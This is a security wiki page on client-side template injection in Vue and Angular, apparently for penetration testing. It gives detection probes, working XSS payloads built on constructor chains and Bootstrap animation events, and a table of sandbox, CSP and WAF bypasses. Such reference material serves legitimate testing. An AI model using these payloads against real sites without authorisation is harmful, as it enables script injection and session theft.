---
title: DOM XSS — Client-Side Template Injection (CSTI)
slug: client-side-template-injection
created_utc: 2026-05-12T00:00:00Z
updated_utc: 2026-05-12T00:00:00Z
tags: [technique/dom-xss, technique/client-side-template-injection, technique/csti]
inbound: []
---

# DOM XSS — Client-Side Template Injection (CSTI)

## Pattern

Client-side template injection occurs when attacker-controlled input is processed by a front-end template engine (Vue, Angular, Handlebars, Mustache, etc.) as a template expression rather than plain text. The engine evaluates the expression in JavaScript, allowing escape to arbitrary code execution via `constructor.constructor` chains, sandbox escapes, or prototype abuse.

## Preconditions

- A JS framework template engine is loaded and active on the page.
- Attacker input is reflected into the template context without HTML-encoding (or encoding is stripped/bypassed by the engine's own expression evaluation).
- For reflected CSTI: server reflection into a page served to AngularJS/Vue; for DOM CSTI: `innerHTML`/`eval` feeds data into template.

## Detection

- `js_analyzer` source → `ng-bind`, `v-html`, `{{ }}` expression context.
- DOM grep: `angular.js`, `vue.js`, `ng-app`, `ng-bind-html`, `v-html`, `{{\s*`, `$compile`.
- Oracle: inject `{{7*7}}` — if rendered as `49`, engine is evaluating; if rendered as `{{7*7}}`, template escaped.
- Check `angular.version.full` in console; Vue: `window.__VUE__` or `window.__vue__` on DOM nodes.

## Triggering

See sub-pages for full per-version payload matrices:
- [./framework-vectors-vue.md](./framework-vectors-vue.md) — Vue 2 and Vue 3 payloads
- [./framework-vectors-angular.md](./framework-vectors-angular.md) — AngularJS sandbox escapes and CSP bypasses

Shortest generic probes:

```html
<!-- Universal constructor chain (Angular 1.0–1.1.5, 1.6+, Vue 2) -->
{{constructor.constructor('alert(1)')()}}

<!-- Angular shorter -->
{{$on.constructor('alert(1)')()}}

<!-- Vue 2 _c helper -->
{{_c.constructor('alert(1)')()}}

<!-- Vue 3 _openBlock -->
{{_openBlock.constructor('alert(1)')()}}
```

Bootstrap-specific (framework CSS, not template engine, but animation event fires without user interaction):

```html
<xss class=progress-bar-animated onanimationstart=alert(1)>
<xss class="carousel slide" data-ride=carousel data-interval=100 ontransitionend=alert(1)><xss class=carousel-inner><xss class="carousel-item active"></xss><xss class=carousel-item></xss></xss></xss>
```

## Bypasses

| Defense | Bypass |
|---|---|
| Encode `{{` / `}}` | Check if encoding is applied before or after template parsing; some engines decode then eval |
| Angular sandbox (v1.2–v1.5) | Version-specific chain (see angular page) |
| Vue expression sandbox | `_c`/`_b`/`_v`/`_s` helpers; v3 `_openBlock`, `_createBlock` |
| CSP blocks `new Function` | Angular `ng-focus` + `orderBy` + `composedPath()` (no eval) |
| WAF blocks `constructor` | Template-literal form: `_c.constructor\`alert(1)\`()` |

## Seen-in-the-wild

- (none yet)

## References

- [../../sources/portswigger-xss-cheatsheet.md](../../sources/portswigger-xss-cheatsheet.md) — primary source; all payloads above are verbatim from the PortSwigger XSS Cheat Sheet (2026 ed.)
